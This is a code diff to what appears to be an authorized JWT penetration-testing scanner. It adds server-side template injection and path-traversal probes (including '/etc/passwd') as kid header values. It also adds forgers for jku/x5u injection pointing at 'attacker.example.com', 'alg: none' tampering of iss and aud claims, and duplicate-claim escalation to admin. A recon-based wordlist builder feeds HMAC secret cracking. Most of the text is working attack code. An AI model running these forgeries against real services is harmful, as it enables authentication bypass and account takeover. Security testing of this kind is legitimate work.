@@ -33,6 +33,14 @@ KID_PATH_PAYLOADS = [
     "../../../dev/null",
     "/dev/null",
     "../../../../etc/passwd",
+    "{{7*7}}",
+    "${7*7}",
+    "{{config}}",
+    "${config}",
+    "{{''.__class__}}",
+    "{{7*'7'}}",
+    "#{7*7}",
+    "<%= 7*7 %>",
 ]
 
 JWKS_PATHS = [
@@ -161,6 +169,10 @@ def forge_none_variants(token, claims=None):
 
 
 def forge_algorithm_confusion(token, public_key, claims=None):
+    from .auth_t2 import jwt_pubkey_confusion
+    # Delegate to T2 module for JWKS-based confusion if public_key is a URL
+    if isinstance(public_key, str) and public_key.startswith("http"):
+        return jwt_pubkey_confusion.scan(public_key, "", token)
     decoded = decode_jwt(token)
     if not decoded:
         return []
@@ -218,6 +230,107 @@ def forge_embedded_jwk(token, claims=None):
     signing_input = f"{h_b64}.{p_b64}".encode("ascii")
     sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
     return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
+
+
+def forge_jku_x5u(token, header_name, attacker_url, claims=None):
+    decoded = decode_jwt(token)
+    if not decoded:
+        return None
+    h = dict(decoded["header"])
+    h[header_name] = attacker_url
+    h["alg"] = h.get("alg", "RS256")
+    p = dict(decoded["payload"])
+    if claims:
+        p.update(claims)
+    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
+    p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
+    return "%s.%s." % (h_b64, p_b64)
+
+
+def forge_iss_aud_tamper(token, claim, new_value, claims=None):
+    decoded = decode_jwt(token)
+    if not decoded:
+        return None
+    h = dict(decoded["header"])
+    h["alg"] = "none"
+    p = dict(decoded["payload"])
+    p[claim] = new_value
+    if claims:
+        p.update(claims)
+    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
+    p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
+    return "%s.%s." % (h_b64, p_b64)
+
+
+def forge_duplicate_claim(token, claim, value1, value2, secret=None):
+    decoded = decode_jwt(token)
+    if not decoded:
+        return None
+    h = dict(decoded["header"])
+    alg = h.get("alg", "HS256")
+    p = dict(decoded["payload"])
+    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
+    pairs = []
+    for k, v in p.items():
+        if k == claim:
+            pairs.append(json.dumps(k) + ":" + json.dumps(value1))
+            pairs.append(json.dumps(k) + ":" + json.dumps(value2))
+        else:
+            pairs.append(json.dumps(k) + ":"
+                         + json.dumps(v, separators=(",", ":")))
+    p_raw = "{" + ",".join(pairs) + "}"
+    p_b64 = b64url_encode(p_raw)
+    if str(alg).lower() == "none" or not secret:
+        return "%s.%s." % (h_b64, p_b64)
+    hfunc = HASH_FUNCS.get(alg)
+    if hfunc is None:
+        return "%s.%s." % (h_b64, p_b64)
+    if isinstance(secret, str):
+        secret = secret.encode("utf-8")
+    signing_input = ("%s.%s" % (h_b64, p_b64)).encode("ascii")
+    sig = hmac.new(secret, signing_input, hfunc).digest()
+    return "%s.%s.%s" % (h_b64, p_b64, b64url_encode(sig))
+
+
+def derive_secrets_from_recon(target_url, roe_guard=None, verify=None,
+                                limit=30, skip_network=False):
+    from urllib.parse import urlparse
+    out = []
+    parsed = urlparse(target_url)
+    host = parsed.hostname or ""
+    base = ""
+    if host:
+        parts = host.split(".")
+        base = parts[-2] if len(parts) >= 2 else parts[0]
+        out.extend([base, host])
+    if not skip_network:
+        try:
+            from .recon import ct_logs
+            ct = ct_logs.harvest(host) if host else None
+            if ct:
+                for sub in (ct.get("subdomains") or [])[:10]:
+                    out.append(sub.split(".")[0])
+        except Exception:
+            pass
+        try:
+            from .recon import wayback
+            wb = wayback.harvest(host) if host else None
+            if wb:
+                for p in (wb.get("paths") or [])[:10]:
+                    for seg in p.strip("/").split("/"):
+                        if seg and len(seg) >= 4 and seg.isalpha():
+                            out.append(seg)
+        except Exception:
+            pass
+    seen = set()
+    deduped = []
+    for s in out:
+        s = str(s).strip()
+        if not s or s in seen or len(s) > 100:
+            continue
+        seen.add(s)
+        deduped.append(s)
+    return deduped[:limit]
 
 
 def crack_hmac(token, secrets=None):
@@ -364,6 +477,18 @@ def _classify(vector, forged, baseline, invalid):
                            f"token and an invalid token; it does not enforce JWT auth here, "
                            f"so token forgery cannot be tested")}
 
+    _f_body = (forged or {}).get("body") or ""
+    _b_body = (baseline or {}).get("body") or ""
+    _i_body = (invalid or {}).get("body") or ""
+    if _f_body and _b_body and _f_body == _b_body:
+        return {"vector": vector, "verdict": "VULNERABLE",
+                "reason": f"forged token body identical to valid-token baseline (HTTP {f_status})",
+                "status": f_status}
+    if _f_body and _i_body and _f_body == _i_body:
+        return {"vector": vector, "verdict": "PASS",
+                "reason": f"forged token body identical to invalid-token response (HTTP {f_status})",
+                "status": f_status}
+
     if f_fp == i_fp or _body_similar(forged, invalid):
         return {"vector": vector, "verdict": "PASS",
                 "reason": f"forged token produced the invalid-token response (HTTP {f_status})"}
@@ -396,6 +521,16 @@ def _run_attack_suite_impl(target_url, token, method="GET", headers=None,
     decoded = decode_jwt(token)
     if not decoded:
         return {"error": "invalid JWT format", "results": [], "summary": {}}
+
+    if secrets is None:
+        try:
+            _rs = derive_secrets_from_recon(target_url,
+                                             roe_guard=roe_guard,
+                                             verify=verify)
+        except Exception:
+            _rs = []
+        if _rs:
+            secrets = _rs
 
     invalid = _request(target_url, method, "invalid.jwt.token", headers, timeout, roe_guard, verify)
     if invalid.get("blocked"):
@@ -432,6 +567,34 @@ def _run_attack_suite_impl(target_url, token, method="GET", headers=None,
     if embedded:
         r = _request(target_url, method, embedded, headers, timeout, roe_guard, verify)
         results.append(_classify("embedded-jwk", r, baseline, invalid))
+
+    for _vec in ("jku", "x5u"):
+        _forged = forge_jku_x5u(
+            token, _vec, "https://attacker.example.com/jwks.json",
+            claim_overrides)
+        if _forged:
+            r = _request(target_url, method, _forged, headers, timeout, roe_guard, verify)
+            results.append(_classify("%s-injection" % _vec, r, baseline, invalid))
+
+    for _claim in ("iss", "aud"):
+        if decoded["payload"].get(_claim):
+            _forged = forge_iss_aud_tamper(
+                token, _claim, "attacker.example.com", claim_overrides)
+            if _forged:
+                r = _request(target_url, method, _forged, headers, timeout, roe_guard, verify)
+                results.append(_classify("%s-tamper" % _claim, r, baseline, invalid))
+
+    for _claim, _v1, _v2 in (
+            ("role", "admin", "user"),
+            ("role", "user", "admin"),
+            ("sub", "1", "9999"),
+            ("is_admin", "true", "false")):
+        _forged = forge_duplicate_claim(token, _claim, _v1, _v2)
+        if _forged:
+            r = _request(target_url, method, _forged, headers, timeout, roe_guard, verify)
+            results.append(_classify(
+                "dup-claim-%s[%s|%s]" % (_claim, _v1, _v2),
+                r, baseline, invalid))
 
     crack = crack_hmac(token, secrets)
     if crack and crack.get("secret"):
